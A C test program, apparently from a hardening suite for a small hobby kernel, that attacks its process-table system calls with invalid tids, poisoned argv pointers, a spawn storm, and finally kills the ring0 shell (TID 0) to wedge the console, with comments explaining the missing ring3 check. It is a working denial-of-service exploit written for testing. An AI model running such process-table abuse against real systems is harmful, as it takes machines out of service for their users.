/* atk_proc.c -- attack vector: the process table (SYS_KILL / SYS_WAIT /
 * SYS_SPAWN) in src/task.c:381-404 and 1591-1625.
 *
 * WHY IT MIGHT CRASH / WEDGE
 *   task_kill(tid, by_uid) only refuses `tid == cur_task` and checks the
 *   uid -- there is NO test that the target is a ring3 task.  TID 0 is the
 *   SHELL, which runs in ring0 on the boot stack, and a CE spawned from
 *   the shell inherits UID_ROOT, so the uid gate is open:
 *
 *       api->kill(0)      -> task_cleanup() destroys the shell task,
 *                            which is blocked in T_WAIT_CHILD waiting for
 *                            THIS program.  shell_run() never returns, so
 *                            the console is gone for good: the machine is
 *                            up but unusable (no prompt, no commands).
 *       api->wait(0)      -> task_wait_child(shell) blocks this task
 *                            forever while the shell blocks on us: a
 *                            mutual deadlock, same end state.
 *       api->wait(own tid)-> same, self-deadlock.
 *   Both make the whole console unusable without any kernel fault, i.e.
 *   the cheapest possible denial of service.  This program proves it,
 *   printing a marker before each step so the evidence screen shows
 *   exactly which call wedged the box.
 *
 * Order: harmless probes first, the shell kill LAST (it is the point of
 * no return).
 */
#include "atk_common.h"

catos_api_t *__ce_api __attribute__((section(".ce_api"))) = (catos_api_t *)0;

__attribute__((section(".text.ce_entry")))
int ce_main(int argc, char **argv) {
    catos_api_t *api = A();
    char *p;
    int i, me = api->gettid();
    (void)argc; (void)argv;

    w("ATK-PROC: process table abuse\n");
    m("me", me); m("uid", api->getuid()); nl();

    step(1); mark("kill() on impossible / unused tids\n");
    {
        static const int T[] = { -1, -2, -1000, 0x7FFFFFFF, (int)0x80000000,
                                 (int)0xFFFFFFFF, 16, 17, 1000, 9999 };
        for (i = 0; i < (int)(sizeof(T) / sizeof(T[0])); i++) {
            m("kill", T[i]);
            wd(api->kill(T[i]));
            w(" ");
        }
        nl();
    }

    step(2); mark("kill(self) and wait() on unused tids\n");
    m("kill(me)", api->kill(me));
    m("wait(999)", api->wait(999));
    m("wait(-1)", api->wait(-1));
    m("wait(16)", api->wait(16));
    nl();

    step(3); mark("spawn a child, kill it, wait it (normal path)\n");
    {
        int tid = api->spawn("/BIN/HELLO.CE", 0, 0);
        m("spawn", tid);
        if (tid > 0) {
            m("kill", api->kill(tid));
            m("wait", api->wait(tid));
            m("wait2", api->wait(tid));      /* double reap of a zombie slot */
        }
        nl();
    }

    step(4); mark("spawn argument abuse\n");
    m("noent", api->spawn("/BIN/NOPE.CE", 0, 0));
    m("dir", api->spawn("/BIN", 0, 0));
    m("argc-1", api->spawn("/BIN/HELLO.CE", -1, 0));
    m("argc99", api->spawn("/BIN/HELLO.CE", 99, 0));
    m("argv-poison", api->spawn("/BIN/HELLO.CE", 3, (char **)0xFFFFFFFFu));
    m("argv-vram", api->spawn("/BIN/HELLO.CE", 3, (char **)0xB8000u));
    m("argv-img", api->spawn("/BIN/HELLO.CE", 3, (char **)0x02000000u));
    nl();

    step(5); mark("spawn storm: 30 children, wait for the live ones\n");
    {
        static int tids[30];
        int n = 0;
        for (i = 0; i < 30; i++) {
            tids[i] = api->spawn("/BIN/HELLO.CE", 0, 0);
            if (tids[i] > 0) n++;
        }
        m("spawned", n); nl();
        for (i = 0; i < 30; i++) if (tids[i] > 0) api->wait(tids[i]);
        w("all reaped\n");
    }

    step(6); mark("now the point of no return: kill(0) == the shell\n");
    p = 0; (void)p;
    m("kill(0)", api->kill(0));
    nl();
    w("shell kill returned -- if you can read this, the kernel survived\n");
    w("\nATK-DONE\n");
    return 0;
}
